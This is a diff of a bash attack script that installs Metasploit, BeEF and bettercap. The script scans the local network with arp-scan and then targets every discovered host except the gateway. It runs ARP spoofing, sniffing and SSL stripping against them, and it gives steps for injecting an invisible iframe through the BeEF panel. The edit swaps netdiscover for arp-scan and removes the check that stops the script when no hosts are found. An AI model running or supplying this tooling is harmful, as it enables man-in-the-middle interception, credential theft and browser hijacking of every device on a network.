@@ -41,7 +41,7 @@ if [[ "$(id -u)" -ne 0 ]]; then
 fi
 
 # --- Tools Installer ---
-for i in wget msfconsole beef-xss bettercap netdiscover; do
+for i in wget msfconsole beef-xss bettercap arp-scan; do
   if ! command -v "$i" &>/dev/null; then
     color_print RED "[X] $i NOT installed!"
     apt install -y $i
@@ -114,22 +114,15 @@ color_print GREEN "[*] Starting BeEF..."
 cd /usr/share/beef-xss && ./beef -x &>/dev/null &
 
 # --- Discover clients with netdiscover ---
-color_print CYAN "[*] Scanning for live hosts on network ($IFACE)..."
-LIVE_HOSTS="/tmp/hosts.txt"
-timeout 30s netdiscover -P > "$LIVE_HOSTS"
+color_print CYAN "[*] Scanning network ($IFACE) using arp-scan..."
+LIVE_HOSTS=$(mktemp)
+arp-scan --interface="$IFACE" --localnet --plain > "$LIVE_HOSTS"
 
-color_print GREEN "[*] Live Clients Detected:"
-awk '/^[0-9]/ {printf "  IP: %-15s  MAC: %-18s  Vendor: %s\n", $1, $2, $3}' "$LIVE_HOSTS"
-NETDISCOVER_IPS=$(awk '/^[0-9]/ {print $1}' "$LIVE_HOSTS" | grep -v "$LAN" | paste -sd ',' -)
+# Filter IPs (remove gateway IP)
+IPS=$(awk '{print $1}' "$LIVE_HOSTS" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v "$LAN" | paste -sd ',' -)
 
-if [[ -z "$NETDISCOVER_IPS" ]]; then
-  color_print RED "[X] No clients found on the network."
-  rm "$LIVE_HOSTS"
-  exit 1
-fi
-
-color_print GREEN "[*] Target IPs: $NETDISCOVER_IPS"
-rm "$LIVE_HOSTS"
+color_print GREEN "[*] Devices detected:"
+awk '{printf "  IP: %-15s  MAC: %-18s\n", $1, $2}' "$LIVE_HOSTS"
 
 # --- Final Info ---
 color_print GREEN "[*] BeEF Panel: http://$LAN/ui/panel"
@@ -140,7 +133,7 @@ color_print GREEN "[*] BeEF > Commands > Misc > Create Invisible Iframe > URL: h
 color_print GREEN "[*] Starting Bettercap MITM attack..."
 
 bettercap -iface "$IFACE" -eval "\
-set arp.spoof.targets $NETDISCOVER_IPS; \
+set arp.spoof.targets $IPS; \
 set arp.spoof.internal true; \
 set net.sniff.verbose true; \
 set https.proxy.sslstrip true; \
